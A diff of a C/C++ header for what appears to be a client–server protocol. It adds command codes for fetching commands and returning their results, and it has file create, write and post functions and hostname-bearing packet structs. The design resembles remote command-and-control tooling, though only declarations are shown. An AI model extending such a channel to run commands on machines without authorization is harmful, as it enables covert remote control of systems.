@@ -74,7 +74,10 @@
 #define CMD_CREATE_FILE			"$$31"
 #define CMD_WRITE_FILE_SATA		"$$32"
 
-#define CMD_READ_ONLINE			"$$33"
+#define CMD_BRING_COMMAND			"$$34"
+//#define CMD_FETACH_COMMAND			"$$35"
+#define CMD_PUT_COMMAND_RESULT		"$$36"
+#define CMD_TAKE_COMMAND_RESULT		"$$37"
 
 
 #define GETHOST_ALLH			"allh"
@@ -85,15 +88,10 @@
 
 #define INVALID_RESPONSE		'datA'
 
+
+
 #pragma pack(1)
 
-typedef struct
-{
-	char cmd[4];
-
-	CHAR subcmd[4];
-
-}IN_ALLHOSTS_HEADER;
 
 typedef struct
 {
@@ -113,7 +111,11 @@ typedef struct
 
 	unsigned char hostname_len;
 
-	unsigned char hostname[UUID_LENGTH];
+	char hostname[UUID_LENGTH];
+
+	unsigned char hostname2_len;
+
+	char hostname2[UUID_LENGTH];
 
 }IN_PACKET_HEADER;
 
@@ -121,33 +123,11 @@ typedef struct
 {
 	DWORD tag;
 
-	char cmd[4];
-
-	unsigned char hostname_len;
-
-	unsigned char hostname[UUID_LENGTH];
+	IN_PACKET_HEADER hdr;
 
 }PACKET_HEADER;
 
-typedef struct
-{
-	PACKET_HEADER hdr;
 
-	unsigned char filename_len;
-
-	unsigned char filename[0];
-
-}PACKET_DATA_HEADER;
-
-typedef struct
-{
-	IN_PACKET_HEADER hdr;
-
-	unsigned char filename_len;
-
-	unsigned char filename[0];
-
-}IN_PACKET_DATA_HEADER;
 
 typedef struct
 {
@@ -178,9 +158,7 @@ public:
 
 	int cmdWrapper(char * data,int  size,const char * cmd,char ** out,int *outsize);
 
-	int cmdWrapper(char* data, int size, const char* cmd, const char* subcmd, char** out, int* outisize);
-
-	int cmdDataWrapper(char* data, int size, const char* cmd, const char* subdata,int subsize,char** out, int* outisize);
+	int cmdWrapper(const char* cmd, const char* subcmd, char** out, int* outisize);
 
 	virtual bool postFile(string filename);
 
